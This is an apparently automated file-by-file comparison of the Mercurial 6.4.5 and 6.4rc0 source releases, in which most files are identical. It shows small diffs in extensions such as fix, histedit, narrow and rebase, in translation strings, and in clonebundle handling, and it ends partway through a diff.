### Comparing `mercurial-6.4.5/hgext/convert/git.py` & `mercurial-6.4rc0/hgext/convert/git.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/convert/gnuarch.py` & `mercurial-6.4rc0/hgext/convert/gnuarch.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/convert/hg.py` & `mercurial-6.4rc0/hgext/convert/hg.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/convert/monotone.py` & `mercurial-6.4rc0/hgext/convert/monotone.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/convert/p4.py` & `mercurial-6.4rc0/hgext/convert/p4.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/convert/subversion.py` & `mercurial-6.4rc0/hgext/convert/subversion.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/convert/transport.py` & `mercurial-6.4rc0/hgext/convert/transport.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/eol.py` & `mercurial-6.4rc0/hgext/eol.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/extdiff.py` & `mercurial-6.4rc0/hgext/extdiff.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/factotum.py` & `mercurial-6.4rc0/hgext/factotum.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/fastannotate/__init__.py` & `mercurial-6.4rc0/hgext/fastannotate/__init__.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/fastannotate/commands.py` & `mercurial-6.4rc0/hgext/fastannotate/commands.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/fastannotate/context.py` & `mercurial-6.4rc0/hgext/fastannotate/context.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/fastannotate/formatter.py` & `mercurial-6.4rc0/hgext/fastannotate/formatter.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/fastannotate/protocol.py` & `mercurial-6.4rc0/hgext/fastannotate/protocol.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/fastannotate/revmap.py` & `mercurial-6.4rc0/hgext/fastannotate/revmap.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/fastannotate/support.py` & `mercurial-6.4rc0/hgext/fastannotate/support.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/fastexport.py` & `mercurial-6.4rc0/hgext/fastexport.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/fetch.py` & `mercurial-6.4rc0/hgext/fetch.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/fix.py` & `mercurial-6.4rc0/hgext/fix.py`

 * *Files 0% similar despite different names*

```diff
@@ -5,21 +5,14 @@
 # This software may be used and distributed according to the terms of the
 # GNU General Public License version 2 or any later version.
 """rewrite file content in changesets or working copy (EXPERIMENTAL)
 
 Provides a command that runs configured tools on the contents of modified files,
 writing back any fixes to the working copy or replacing changesets.
 
-Fixer tools are run in the repository's root directory. This allows them to read
-configuration files from the working copy, or even write to the working copy.
-The working copy is not updated to match the revision being fixed. In fact,
-several revisions may be fixed in parallel. Writes to the working copy are not
-amended into the revision being fixed; fixer tools MUST always read content to
-be fixed from stdin, and write fixed file content back to stdout.
-
 Here is an example configuration that causes :hg:`fix` to apply automatic
 formatting fixes to modified lines in C++ code::
 
   [fix]
   clang-format:command=clang-format --assume-filename={rootpath}
   clang-format:linerange=--lines={first}:{last}
   clang-format:pattern=set:**.cpp or **.hpp
@@ -116,14 +109,21 @@
     Run once after all files and revisions have been handled. Provides
     "$HG_REPLACEMENTS" with information about what revisions were created and
     made obsolete. Provides a boolean "$HG_WDIRWRITTEN" to indicate whether any
     files in the working copy were updated. Provides a list "$HG_METADATA"
     mapping fixer tool names to lists of metadata values returned from
     executions that modified a file. This aggregates the same metadata
     previously passed to the "postfixfile" hook.
+
+Fixer tools are run in the repository's root directory. This allows them to read
+configuration files from the working copy, or even write to the working copy.
+The working copy is not updated to match the revision being fixed. In fact,
+several revisions may be fixed in parallel. Writes to the working copy are not
+amended into the revision being fixed; fixer tools should always write fixed
+file content back to stdout as documented above.
 """
 
 
 import collections
 import itertools
 import os
 import re
@@ -235,16 +235,15 @@
     [allopt, baseopt, revopt, sourceopt, wdiropt, wholeopt],
     usage,
     helpcategory=command.CATEGORY_FILE_CONTENTS,
 )
 def fix(ui, repo, *pats, **opts):
     """rewrite file content in changesets or working directory
 
-    Runs any configured tools to fix the content of files. (See
-    :hg:`help -e fix` for details about configuring tools.) Only affects files
+    Runs any configured tools to fix the content of files. Only affects files
     with changes, unless file arguments are provided. Only affects changed lines
     of files, unless the --whole flag is used. Some tools may always affect the
     whole file regardless of --whole.
 
     If --working-dir is used, files with uncommitted changes in the working copy
     will be fixed. Note that no backup are made.
```

### Comparing `mercurial-6.4.5/hgext/fsmonitor/__init__.py` & `mercurial-6.4rc0/hgext/fsmonitor/__init__.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/fsmonitor/pywatchman/__init__.py` & `mercurial-6.4rc0/hgext/fsmonitor/pywatchman/__init__.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/fsmonitor/pywatchman/bser.c` & `mercurial-6.4rc0/hgext/fsmonitor/pywatchman/bser.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/fsmonitor/pywatchman/capabilities.py` & `mercurial-6.4rc0/hgext/fsmonitor/pywatchman/capabilities.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/fsmonitor/pywatchman/compat.py` & `mercurial-6.4rc0/hgext/fsmonitor/pywatchman/compat.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/fsmonitor/pywatchman/encoding.py` & `mercurial-6.4rc0/hgext/fsmonitor/pywatchman/encoding.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/fsmonitor/pywatchman/load.py` & `mercurial-6.4rc0/hgext/fsmonitor/pywatchman/load.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/fsmonitor/pywatchman/pybser.py` & `mercurial-6.4rc0/hgext/fsmonitor/pywatchman/pybser.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/fsmonitor/state.py` & `mercurial-6.4rc0/hgext/fsmonitor/state.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/fsmonitor/watchmanclient.py` & `mercurial-6.4rc0/hgext/fsmonitor/watchmanclient.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/git/TODO.md` & `mercurial-6.4rc0/hgext/git/TODO.md`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/git/__init__.py` & `mercurial-6.4rc0/hgext/git/__init__.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/git/dirstate.py` & `mercurial-6.4rc0/hgext/git/dirstate.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/git/gitlog.py` & `mercurial-6.4rc0/hgext/git/gitlog.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/git/gitutil.py` & `mercurial-6.4rc0/hgext/git/gitutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/git/index.py` & `mercurial-6.4rc0/hgext/git/index.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/git/manifest.py` & `mercurial-6.4rc0/hgext/git/manifest.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/githelp.py` & `mercurial-6.4rc0/hgext/githelp.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/gpg.py` & `mercurial-6.4rc0/hgext/gpg.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/graphlog.py` & `mercurial-6.4rc0/hgext/graphlog.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/hgk.py` & `mercurial-6.4rc0/hgext/hgk.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/highlight/__init__.py` & `mercurial-6.4rc0/hgext/highlight/__init__.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/highlight/highlight.py` & `mercurial-6.4rc0/hgext/highlight/highlight.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/histedit.py` & `mercurial-6.4rc0/hgext/histedit.py`

 * *Files 1% similar despite different names*

```diff
@@ -1423,19 +1423,19 @@
 
     def render_string(self, win, output, diffcolors=False):
         maxy, maxx = win.getmaxyx()
         length = min(maxy - 1, len(output))
         for y in range(0, length):
             line = output[y]
             if diffcolors:
-                if line.startswith(b'+'):
+                if line and line[0] == b'+':
                     win.addstr(
                         y, 0, line, curses.color_pair(COLOR_DIFF_ADD_LINE)
                     )
-                elif line.startswith(b'-'):
+                elif line and line[0] == b'-':
                     win.addstr(
                         y, 0, line, curses.color_pair(COLOR_DIFF_DEL_LINE)
                     )
                 elif line.startswith(b'@@ '):
                     win.addstr(y, 0, line, curses.color_pair(COLOR_DIFF_OFFSET))
                 else:
                     win.addstr(y, 0, line)
```

### Comparing `mercurial-6.4.5/hgext/hooklib/__init__.py` & `mercurial-6.4rc0/hgext/hooklib/__init__.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/hooklib/changeset_obsoleted.py` & `mercurial-6.4rc0/hgext/hooklib/changeset_obsoleted.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/hooklib/changeset_published.py` & `mercurial-6.4rc0/hgext/hooklib/changeset_published.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/hooklib/enforce_draft_commits.py` & `mercurial-6.4rc0/hgext/hooklib/enforce_draft_commits.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/hooklib/reject_merge_commits.py` & `mercurial-6.4rc0/hgext/hooklib/reject_merge_commits.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/hooklib/reject_new_heads.py` & `mercurial-6.4rc0/hgext/hooklib/reject_new_heads.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/infinitepush/README` & `mercurial-6.4rc0/hgext/infinitepush/README`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/infinitepush/__init__.py` & `mercurial-6.4rc0/hgext/infinitepush/__init__.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/infinitepush/bundleparts.py` & `mercurial-6.4rc0/hgext/infinitepush/bundleparts.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/infinitepush/common.py` & `mercurial-6.4rc0/hgext/infinitepush/common.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/infinitepush/fileindexapi.py` & `mercurial-6.4rc0/hgext/infinitepush/fileindexapi.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/infinitepush/indexapi.py` & `mercurial-6.4rc0/hgext/infinitepush/indexapi.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/infinitepush/schema.sql` & `mercurial-6.4rc0/hgext/infinitepush/schema.sql`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/infinitepush/sqlindexapi.py` & `mercurial-6.4rc0/hgext/infinitepush/sqlindexapi.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/infinitepush/store.py` & `mercurial-6.4rc0/hgext/infinitepush/store.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/journal.py` & `mercurial-6.4rc0/hgext/journal.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/keyword.py` & `mercurial-6.4rc0/hgext/keyword.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/largefiles/__init__.py` & `mercurial-6.4rc0/hgext/largefiles/__init__.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/largefiles/basestore.py` & `mercurial-6.4rc0/hgext/largefiles/basestore.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/largefiles/lfcommands.py` & `mercurial-6.4rc0/hgext/largefiles/lfcommands.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/largefiles/lfutil.py` & `mercurial-6.4rc0/hgext/largefiles/lfutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/largefiles/localstore.py` & `mercurial-6.4rc0/hgext/largefiles/localstore.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/largefiles/overrides.py` & `mercurial-6.4rc0/hgext/largefiles/overrides.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/largefiles/proto.py` & `mercurial-6.4rc0/hgext/largefiles/proto.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/largefiles/remotestore.py` & `mercurial-6.4rc0/hgext/largefiles/remotestore.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/largefiles/reposetup.py` & `mercurial-6.4rc0/hgext/largefiles/reposetup.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/largefiles/storefactory.py` & `mercurial-6.4rc0/hgext/largefiles/storefactory.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/largefiles/wirestore.py` & `mercurial-6.4rc0/hgext/largefiles/wirestore.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/lfs/TODO.rst` & `mercurial-6.4rc0/hgext/lfs/TODO.rst`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/lfs/__init__.py` & `mercurial-6.4rc0/hgext/lfs/__init__.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/lfs/blobstore.py` & `mercurial-6.4rc0/hgext/lfs/blobstore.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/lfs/pointer.py` & `mercurial-6.4rc0/hgext/lfs/pointer.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/lfs/wireprotolfsserver.py` & `mercurial-6.4rc0/hgext/lfs/wireprotolfsserver.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/lfs/wrapper.py` & `mercurial-6.4rc0/hgext/lfs/wrapper.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/logtoprocess.py` & `mercurial-6.4rc0/hgext/logtoprocess.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/mq.py` & `mercurial-6.4rc0/hgext/mq.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/narrow/TODO.rst` & `mercurial-6.4rc0/hgext/narrow/TODO.rst`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/narrow/__init__.py` & `mercurial-6.4rc0/hgext/narrow/__init__.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/narrow/narrowbundle2.py` & `mercurial-6.4rc0/hgext/narrow/narrowbundle2.py`

 * *Files 2% similar despite different names*

```diff
@@ -2,31 +2,32 @@
 #
 # Copyright 2017 Google, Inc.
 #
 # This software may be used and distributed according to the terms of the
 # GNU General Public License version 2 or any later version.
 
 
+import errno
 import struct
 
 from mercurial.i18n import _
 from mercurial import (
     bundle2,
     changegroup,
     error,
     exchange,
     localrepo,
     narrowspec,
     repair,
     requirements,
     scmutil,
-    transaction,
     util,
     wireprototypes,
 )
+from mercurial.utils import stringutil
 
 _NARROWACL_SECTION = b'narrowacl'
 _CHANGESPECPART = b'narrow:changespec'
 _RESSPECS = b'narrow:responsespec'
 _SPECPART = b'narrow:spec'
 _SPECPART_INCLUDE = b'include'
 _SPECPART_EXCLUDE = b'exclude'
@@ -290,15 +291,24 @@
             else:
                 gen.apply(
                     repo, b'strip', b'bundle:' + vfs.join(chgrpfile), True
                 )
     finally:
         f.close()
 
-    transaction.cleanup_undo_files(repo.ui.warn, repo.vfs_map)
+    # remove undo files
+    for undovfs, undofile in repo.undofiles():
+        try:
+            undovfs.unlink(undofile)
+        except OSError as e:
+            if e.errno != errno.ENOENT:
+                ui.warn(
+                    _(b'error removing %s: %s\n')
+                    % (undovfs.join(undofile), stringutil.forcebytestr(e))
+                )
 
     # Remove partial backup only if there were no exceptions
     op._widen_uninterr.__exit__(None, None, None)
     vfs.unlink(chgrpfile)
 
 
 def setup():
```

### Comparing `mercurial-6.4.5/hgext/narrow/narrowcommands.py` & `mercurial-6.4rc0/hgext/narrow/narrowcommands.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/narrow/narrowdirstate.py` & `mercurial-6.4rc0/hgext/narrow/narrowdirstate.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/narrow/narrowrepo.py` & `mercurial-6.4rc0/hgext/narrow/narrowrepo.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/narrow/narrowtemplates.py` & `mercurial-6.4rc0/hgext/narrow/narrowtemplates.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/narrow/narrowwirepeer.py` & `mercurial-6.4rc0/hgext/narrow/narrowwirepeer.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/notify.py` & `mercurial-6.4rc0/hgext/notify.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/pager.py` & `mercurial-6.4rc0/hgext/pager.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/patchbomb.py` & `mercurial-6.4rc0/hgext/patchbomb.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/phabricator.py` & `mercurial-6.4rc0/hgext/phabricator.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/purge.py` & `mercurial-6.4rc0/hgext/purge.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/rebase.py` & `mercurial-6.4rc0/hgext/rebase.py`

 * *Files 0% similar despite different names*

```diff
@@ -834,34 +834,29 @@
                         b"warning: new changesets detected on "
                         b"destination branch, can't strip\n"
                     )
                 )
                 cleanup = False
 
             if cleanup:
-
                 if rebased:
                     strippoints = [
                         c.node() for c in repo.set(b'roots(%ld)', rebased)
                     ]
 
                 updateifonnodes = set(rebased)
                 updateifonnodes.update(self.destmap.values())
 
-                if not confirm:
-                    # note: when dry run is set the `rebased` and `destmap`
-                    # variables seem to contain "bad" contents, so do not
-                    # rely on them. As dryrun does not need this part of
-                    # the cleanup, this is "fine"
+                if not dryrun and not confirm:
                     updateifonnodes.add(self.originalwd)
 
                 shouldupdate = repo[b'.'].rev() in updateifonnodes
 
                 # Update away from the rebase if necessary
-                if not dryrun and shouldupdate:
+                if shouldupdate:
                     mergemod.clean_update(repo[self.originalwd])
 
                 # Strip from the first rebased revision
                 if rebased:
                     repair.strip(repo.ui, repo, strippoints, backup=backup)
 
             if self.activebookmark and self.activebookmark in repo._bookmarks:
```

### Comparing `mercurial-6.4.5/hgext/record.py` & `mercurial-6.4rc0/hgext/record.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/releasenotes.py` & `mercurial-6.4rc0/hgext/releasenotes.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/relink.py` & `mercurial-6.4rc0/hgext/relink.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/remotefilelog/README.md` & `mercurial-6.4rc0/hgext/remotefilelog/README.md`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/remotefilelog/__init__.py` & `mercurial-6.4rc0/hgext/remotefilelog/__init__.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/remotefilelog/basepack.py` & `mercurial-6.4rc0/hgext/remotefilelog/basepack.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/remotefilelog/basestore.py` & `mercurial-6.4rc0/hgext/remotefilelog/basestore.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/remotefilelog/connectionpool.py` & `mercurial-6.4rc0/hgext/remotefilelog/connectionpool.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/remotefilelog/constants.py` & `mercurial-6.4rc0/hgext/remotefilelog/constants.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/remotefilelog/contentstore.py` & `mercurial-6.4rc0/hgext/remotefilelog/contentstore.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/remotefilelog/datapack.py` & `mercurial-6.4rc0/hgext/remotefilelog/datapack.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/remotefilelog/debugcommands.py` & `mercurial-6.4rc0/hgext/remotefilelog/debugcommands.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/remotefilelog/fileserverclient.py` & `mercurial-6.4rc0/hgext/remotefilelog/fileserverclient.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/remotefilelog/historypack.py` & `mercurial-6.4rc0/hgext/remotefilelog/historypack.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/remotefilelog/metadatastore.py` & `mercurial-6.4rc0/hgext/remotefilelog/metadatastore.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/remotefilelog/remotefilectx.py` & `mercurial-6.4rc0/hgext/remotefilelog/remotefilectx.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/remotefilelog/remotefilelog.py` & `mercurial-6.4rc0/hgext/remotefilelog/remotefilelog.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/remotefilelog/remotefilelogserver.py` & `mercurial-6.4rc0/hgext/remotefilelog/remotefilelogserver.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/remotefilelog/repack.py` & `mercurial-6.4rc0/hgext/remotefilelog/repack.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/remotefilelog/shallowbundle.py` & `mercurial-6.4rc0/hgext/remotefilelog/shallowbundle.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/remotefilelog/shallowrepo.py` & `mercurial-6.4rc0/hgext/remotefilelog/shallowrepo.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/remotefilelog/shallowutil.py` & `mercurial-6.4rc0/hgext/remotefilelog/shallowutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/remotefilelog/shallowverifier.py` & `mercurial-6.4rc0/hgext/remotefilelog/shallowverifier.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/remotenames.py` & `mercurial-6.4rc0/hgext/remotenames.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/schemes.py` & `mercurial-6.4rc0/hgext/schemes.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/share.py` & `mercurial-6.4rc0/hgext/share.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/show.py` & `mercurial-6.4rc0/hgext/show.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/sparse.py` & `mercurial-6.4rc0/hgext/sparse.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/split.py` & `mercurial-6.4rc0/hgext/split.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/sqlitestore.py` & `mercurial-6.4rc0/hgext/sqlitestore.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/strip.py` & `mercurial-6.4rc0/hgext/strip.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/transplant.py` & `mercurial-6.4rc0/hgext/transplant.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/uncommit.py` & `mercurial-6.4rc0/hgext/uncommit.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/win32mbcs.py` & `mercurial-6.4rc0/hgext/win32mbcs.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/win32text.py` & `mercurial-6.4rc0/hgext/win32text.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/zeroconf/Zeroconf.py` & `mercurial-6.4rc0/hgext/zeroconf/Zeroconf.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgext/zeroconf/__init__.py` & `mercurial-6.4rc0/hgext/zeroconf/__init__.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/hgweb.cgi` & `mercurial-6.4rc0/hgweb.cgi`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/i18n/check-translation.py` & `mercurial-6.4rc0/i18n/check-translation.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/i18n/da.po` & `mercurial-6.4rc0/i18n/da.po`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/i18n/de.po` & `mercurial-6.4rc0/i18n/de.po`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/i18n/el.po` & `mercurial-6.4rc0/i18n/el.po`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/i18n/fr.po` & `mercurial-6.4rc0/i18n/fr.po`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/i18n/hggettext` & `mercurial-6.4rc0/i18n/hggettext`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/i18n/it.po` & `mercurial-6.4rc0/i18n/it.po`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/i18n/ja.po` & `mercurial-6.4rc0/i18n/ja.po`

 * *Files 0% similar despite different names*

```diff
@@ -37060,16 +37060,16 @@
 msgid "TLS 1.1 not supported by this Python"
 msgstr " Python  TLS 1.1 "
 
 msgid "TLS 1.2 not supported by this Python"
 msgstr " Python  TLS 1.2 "
 
 #, python-format
-msgid "invalid value for server-insecure-exact-protocol: %s"
-msgstr " server-insecure-exact-protocol : %s"
+msgid "invalid value for serverexactprotocol: %s"
+msgstr " serverexactprotocol : %s"
 
 #, python-format
 msgid "too many wildcards in certificate DNS name: %s"
 msgstr " DNS : %s"
 
 msgid "no certificate received"
 msgstr ""
```

### Comparing `mercurial-6.4.5/i18n/polib.LICENSE` & `mercurial-6.4rc0/i18n/polib.LICENSE`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/i18n/polib.py` & `mercurial-6.4rc0/i18n/polib.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/i18n/posplit` & `mercurial-6.4rc0/i18n/posplit`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/i18n/pt_BR.po` & `mercurial-6.4rc0/i18n/pt_BR.po`

 * *Files 0% similar despite different names*

```diff
@@ -38338,16 +38338,16 @@
 msgid "TLS 1.1 not supported by this Python"
 msgstr "TLS 1.1 no  suportado por esta verso do Python"
 
 msgid "TLS 1.2 not supported by this Python"
 msgstr "TLS 1.2 no  suportado por esta verso do Python"
 
 #, python-format
-msgid "invalid value for server-insecure-exact-protocol: %s"
-msgstr "valor invlido para server-insecure-exact-protocol: %s"
+msgid "invalid value for serverexactprotocol: %s"
+msgstr "valor invlido para serverexactprotocol: %s"
 
 #, python-format
 msgid "too many wildcards in certificate DNS name: %s"
 msgstr "excesso de caracteres curinga no nome DNS do certificado: %s"
 
 msgid "no certificate received"
 msgstr "nenhum certificado recebido"
```

### Comparing `mercurial-6.4.5/i18n/ro.po` & `mercurial-6.4rc0/i18n/ro.po`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/i18n/ru.po` & `mercurial-6.4rc0/i18n/ru.po`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/i18n/sv.po` & `mercurial-6.4rc0/i18n/sv.po`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/i18n/zh_CN.po` & `mercurial-6.4rc0/i18n/zh_CN.po`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/i18n/zh_TW.po` & `mercurial-6.4rc0/i18n/zh_TW.po`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/ancestor.py` & `mercurial-6.4rc0/mercurial/ancestor.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/archival.py` & `mercurial-6.4rc0/mercurial/archival.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/bdiff.c` & `mercurial-6.4rc0/mercurial/bdiff.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/bitmanipulation.h` & `mercurial-6.4rc0/mercurial/bitmanipulation.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/bookmarks.py` & `mercurial-6.4rc0/mercurial/bookmarks.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/branchmap.py` & `mercurial-6.4rc0/mercurial/branchmap.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/bundle2.py` & `mercurial-6.4rc0/mercurial/bundle2.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/bundlecaches.py` & `mercurial-6.4rc0/mercurial/bundlecaches.py`

 * *Files 4% similar despite different names*

```diff
@@ -20,19 +20,14 @@
     util,
 )
 from .utils import stringutil
 
 urlreq = util.urlreq
 
 CB_MANIFEST_FILE = b'clonebundles.manifest'
-SUPPORTED_CLONEBUNDLE_SCHEMES = [
-    b"http://",
-    b"https://",
-    b"largefile://",
-]
 
 
 @attr.s
 class bundlespec:
     compression = attr.ib()
     wirecompression = attr.ib()
     version = attr.ib()
@@ -338,86 +333,78 @@
         and bundlespec.contentopts.get(b'streamv2')
     ):
         return True
 
     return False
 
 
-def filterclonebundleentries(
-    repo, entries, streamclonerequested=False, pullbundles=False
